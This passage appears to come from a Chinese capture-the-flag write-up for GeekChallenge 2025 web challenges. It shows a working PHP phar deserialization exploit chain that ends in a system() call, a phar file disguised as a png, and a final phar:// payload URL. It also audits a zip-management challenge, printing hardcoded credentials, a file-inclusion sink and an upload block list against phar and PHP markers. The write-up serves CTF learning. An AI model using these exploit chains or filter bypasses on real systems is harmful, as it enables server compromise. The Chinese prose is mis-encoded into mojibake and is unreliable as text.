</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;png&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;image/png&#39;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;zip&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;application/zip&#39;</span>, <span style="color:#e6db74">&#39;application/x-zip-compressed&#39;</span>, <span style="color:#e6db74">&#39;multipart/x-zip&#39;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;gif&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;image/gif&#39;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;gz&#39;</span>   <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;application/gzip&#39;</span>, <span style="color:#e6db74">&#39;application/x-gzip&#39;</span>]
</span></span><span style="display:flex;"><span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$resultMessage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;POST&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>])) {
</span></span><span style="display:flex;"><span>    $file <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($file[<span style="color:#e6db74">&#39;error&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#a6e22e">UPLOAD_ERR_OK</span>) {
</span></span><span style="display:flex;"><span>        $originalName <span style="color:#f92672">=</span> $file[<span style="color:#e6db74">&#39;name&#39;</span>];
</span></span><span style="display:flex;"><span>        $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">pathinfo</span>($originalName, <span style="color:#a6e22e">PATHINFO_EXTENSION</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($ext, $whitelist, <span style="color:#66d9ef">true</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;File extension not allowed.&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $mime <span style="color:#f92672">=</span> $file[<span style="color:#e6db74">&#39;type&#39;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($allowedMimes[$ext]) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($mime, $allowedMimes[$ext], <span style="color:#66d9ef">true</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;MIME type mismatch or not allowed. Detected: &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($mime));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $safeBaseName <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/[^A-Za-z0-9_\-\.]/&#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>, <span style="color:#a6e22e">basename</span>($originalName));
</span></span><span style="display:flex;"><span>        $safeBaseName <span style="color:#f92672">=</span> <span style="color:#a6e22e">ltrim</span>($safeBaseName, <span style="color:#e6db74">&#39;.&#39;</span>);
</span></span><span style="display:flex;"><span>        $targetFilename <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;_&#39;</span> <span style="color:#f92672">.</span> $safeBaseName;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;/tmp/log.txt&#39;</span>, <span style="color:#e6db74">&#34;upload file success: </span><span style="color:#e6db74">$targetFilename</span><span style="color:#e6db74">, MIME: </span><span style="color:#e6db74">$mime\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $targetPath <span style="color:#f92672">=</span> $uploadDir <span style="color:#f92672">.</span> $targetFilename;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">move_uploaded_file</span>($file[<span style="color:#e6db74">&#39;tmp_name&#39;</span>], $targetPath)) {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">@</span><span style="color:#a6e22e">chmod</span>($targetPath, <span style="color:#ae81ff">0644</span>);
</span></span><span style="display:flex;"><span>            $resultMessage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;success&#34;&gt; File uploaded successfully &#39;</span><span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&lt;/div&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            $resultMessage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;error&#34;&gt; Failed to move uploaded file.&lt;/div&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $resultMessage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;error&#34;&gt; Upload error: &#39;</span> <span style="color:#f92672">.</span> $file[<span style="color:#e6db74">&#39;error&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&lt;/div&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><ul>
<li>å¯¹ä¸Šä¼ å¯¹æ–‡ä»¶è¿›è¡Œç™½åå•æ£€æŸ¥æœºåˆ¶</li>
<li>æ–‡ä»¶ä¸Šä¼ è·¯å¾„ä¸º uploads/</li>
<li>ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶åè¿›è¡Œé‡å‘½åï¼Œé‡å‘½åä¿¡æ¯è®°å½•åœ¨ /tmp/log.txt æ–‡ä»¶ä¸­</li>
</ul>
<p><strong>æ„é€  Phar æ–‡ä»¶</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#75715e">// æ„é€ ä»£ç 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $luo;  <span style="color:#75715e">// 2 B
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__toString</span>() {  <span style="color:#75715e">// 2 å°†å¯¹è±¡å½“åšå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $function <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">luo</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $function();  <span style="color:#75715e">// 1 __invoke()è§¦å‘
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">B</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $a;  <span style="color:#75715e">// 1 C
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> $test;  <span style="color:#75715e">// 3 A
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__wakeup</span>()  <span style="color:#75715e">// 3 ååºåˆ—åŒ–æ—¶è§¦å‘
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span>);  <span style="color:#75715e">// 2 __toString()è§¦å‘
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__invoke</span>() {  <span style="color:#75715e">// 1 å°†å¯¹è±¡å½“åšå‡½æ•°ä½¿ç”¨æ—¶è°ƒç”¨
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rce_me</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">C</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $b;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>($b <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> $b;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">rce_me</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Success!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /flag/flag.txt &gt; /tmp/flag&#34;</span>);  <span style="color:#75715e">// æœ€åç›®æ ‡
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">C</span>();
</span></span><span style="display:flex;"><span>$b <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">B</span>();
</span></span><span style="display:flex;"><span>$b<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> $a;
</span></span><span style="display:flex;"><span>$c <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">A</span>();
</span></span><span style="display:flex;"><span>$c<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">luo</span> <span style="color:#f92672">=</span> $b;
</span></span><span style="display:flex;"><span>$d <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">B</span>();
</span></span><span style="display:flex;"><span>$d<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span> <span style="color:#f92672">=</span> $c;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#34;exp.phar&#34;</span>);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">startBuffering</span>();
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setStub</span>(<span style="color:#e6db74">&#34;&lt;?php __HALT_COMPILER();?&gt;&#34;</span>);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setMetadata</span>($d);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#34;test.txt&#34;</span>,<span style="color:#e6db74">&#34;test&#34;</span>);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stopBuffering</span>();
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p><strong>å°†æ–‡ä»¶åç¼€æ”¹ä¸º png ä¸Šä¼ ï¼Œåœ¨æŸ¥çœ‹ /tmp/log.txt æ–‡ä»¶å¾—åˆ°å®é™…æ–‡ä»¶å<code>upload file success: 1763431210_exp.png, MIME: image/png</code>ï¼Œç„¶åæœ€ç»ˆ Payload å¦‚ä¸‹</strong></p>
<pre tabindex="0"><code class="language-Payload" data-lang="Payload">index.php?filename=phar://uploads/1763431210_exp.png&amp;serialized=1
</code></pre><h1 id="eeeeezzzzzzzip">eeeeezzzzzzZip<a hidden class="anchor" aria-hidden="true" href="#eeeeezzzzzzzip">#</a></h1>
<p>#ä»£ç å®¡è®¡ #ç›®å½•æ‰«æ #æ–‡ä»¶ä¸Šä¼  #æ–‡ä»¶åŒ…å«</p>
<p>é¢˜ç›®æè¿°ï¼šå°æ­å†™äº†ä¸€ä¸ªå‹ç¼©åŒ…ç®¡ç†å¹³å°ï¼Œä½†æ˜¯ä½œä¸ºä¸€ä¸ªå¼€å‘å¾ˆä¸ä»”ç»†ï¼Œä¹Ÿè®¸æœ‰ä»€ä¹ˆé—®é¢˜åœ¨é‡Œé¢å‘¢</p>
<p>ç½‘ç«™é¦–é¡µæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ç®¡ç†å¹³å°ç™»å½•é¡µé¢ï¼Œé¦–å…ˆå°è¯•ç™»å½•å¼±å£ä»¤å’Œ SQLi å‡æ— æœï¼Œç”¨ dirsearch ç›®å½•æ‰«æï¼Œå¾—åˆ° /upload.php æ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œä»¥åŠ www.zip ç½‘ç«™æºç å‹ç¼©åŒ…ï¼Œè§£å‹å<strong>è¿›è¡Œæºç å®¡è®¡</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#75715e">// login.php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span>$err <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;POST&#39;</span>) {
</span></span><span style="display:flex;"><span>    $u <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>    $p <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;pass&#39;</span>] <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($u <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $p <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;guest123&#39;</span>) {
</span></span><span style="display:flex;"><span>        $_SESSION[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">=</span> $u;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: index.php&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $err <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ç™»å½•å¤±è´¥ï¼šç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><ul>
<li>æš´éœ²äº†ç®¡ç†å‘˜ç”¨æˆ·åå’Œå¯†ç </li>
</ul>
<p><strong>ç™»å½•å‹ç¼©åŒ…ç®¡ç†å¹³å°åå°ï¼Œå‘ç°æ–‡ä»¶ä¸Šä¼ é¡µé¢ä¹Ÿå°±æ˜¯ /upload.php</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#75715e">// index.php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;user&#39;</span>])) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: login.php&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;GeekChallenge_2025&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;dir&#39;</span>])) {
</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;dir&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">bin2hex</span>(<span style="color:#a6e22e">random_bytes</span>(<span style="color:#ae81ff">4</span>));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$SANDBOX <span style="color:#f92672">=</span> <span style="color:#a6e22e">sys_get_temp_dir</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;/uploads_&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>($salt <span style="color:#f92672">.</span> $_SESSION[<span style="color:#e6db74">&#39;dir&#39;</span>]);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($SANDBOX)) <span style="color:#a6e22e">mkdir</span>($SANDBOX, <span style="color:#ae81ff">0700</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$files <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_diff</span>(<span style="color:#a6e22e">scandir</span>($SANDBOX), [<span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;..&#39;</span>]);
</span></span><span style="display:flex;"><span>$result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;f&#39;</span>])) {
</span></span><span style="display:flex;"><span>    $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">basename</span>($_GET[<span style="color:#e6db74">&#39;f&#39;</span>]);
</span></span><span style="display:flex;"><span>    $fullpath <span style="color:#f92672">=</span> $SANDBOX <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $filename;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span>($fullpath) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\.(zip|bz2|gz|xz|7z)$/i&#39;</span>, $filename)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ob_start</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">@</span><span style="color:#66d9ef">include</span>($fullpath);
</span></span><span style="display:flex;"><span>        $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">ob_get_clean</span>();
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;æ–‡ä»¶ä¸å­˜åœ¨æˆ–éæ³•ç±»å‹ã€‚&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><ul>
<li>
<p>é€šè¿‡ GET æ–¹æ³•ä¼ å…¥<code>f</code>å‚æ•°ï¼ˆä¸Šä¼ æ–‡ä»¶åï¼‰ï¼Œæœ€ç»ˆæ‰§è¡Œæ–‡ä»¶åŒ…å«</p>
</li>
<li>
<p>è¿›è¡Œæ–‡ä»¶ååç¼€ç™½åå•åŒ¹é…</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#75715e">// upload.php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>$allowed_extensions <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;zip&#39;</span>, <span style="color:#e6db74">&#39;bz2&#39;</span>, <span style="color:#e6db74">&#39;gz&#39;</span>, <span style="color:#e6db74">&#39;xz&#39;</span>, <span style="color:#e6db74">&#39;7z&#39;</span>];
</span></span><span style="display:flex;"><span>$allowed_mime_types <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;application/zip&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;application/x-bzip2&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;application/gzip&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;application/x-gzip&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;application/x-xz&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;application/x-7z-compressed&#39;</span>,
</span></span><span style="display:flex;"><span>];
</span></span><span style="display:flex;"><span>$BLOCK_LIST <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;__HALT_COMPILER()&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;PK&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&lt;?&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&lt;?php&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phar://&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;?&gt;&#34;</span>
</span></span><span style="display:flex;"><span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">content_filter</span>($tmpfile, $block_list) {
</span></span><span style="display:flex;"><span>    $fh <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($tmpfile, <span style="color:#e6db74">&#34;rb&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$fh) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    $head <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($fh, <span style="color:#ae81ff">4096</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fseek</span>($fh, <span style="color:#f92672">-</span><span style="color:#ae81ff">4096</span>, <span style="color:#a6e22e">SEEK_END</span>);
</span></span><span style="display:flex;"><span>    $tail <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($fh, <span style="color:#ae81ff">4096</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($fh);
</span></span><span style="display:flex;"><span>    $sample <span style="color:#f92672">=</span> $head <span style="color:#f92672">.</span> $tail;
</span></span><span style="display:flex;"><span>    $lower <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>($sample);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($block_list <span style="color:#66d9ef">as</span> $pat) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stripos</span>($sample, $pat) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// ä¸ºé¿å…æ³„éœ²è¿‡å¤šä¿¡æ¯ï¼Œè¿™é‡Œä¸ç›´æ¥ echo sampleï¼ˆä½ ä¹‹å‰æœ‰ echoï¼Œä¿æŒæ³¨é‡Šï¼‰
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stripos</span>($lower, <span style="color:#a6e22e">strtolower</span>($pat)) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;dir&#39;</span>])) {
</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;dir&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">bin2hex</span>(<span style="color:#a6e22e">random_bytes</span>(<span style="color:#ae81ff">4</span>));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;GeekChallenge_2025&#39;</span>;
</span></span><span style="display:flex;"><span>$SANDBOX <span style="color:#f92672">=</span> <span style="color:#a6e22e">sys_get_temp_dir</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;/uploads_&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>($salt <span style="color:#f92672">.</span> $_SESSION[<span style="color:#e6db74">&#39;dir&#39;</span>]);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($SANDBOX)) <span style="color:#a6e22e">mkdir</span>($SANDBOX, <span style="color:#ae81ff">0700</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>
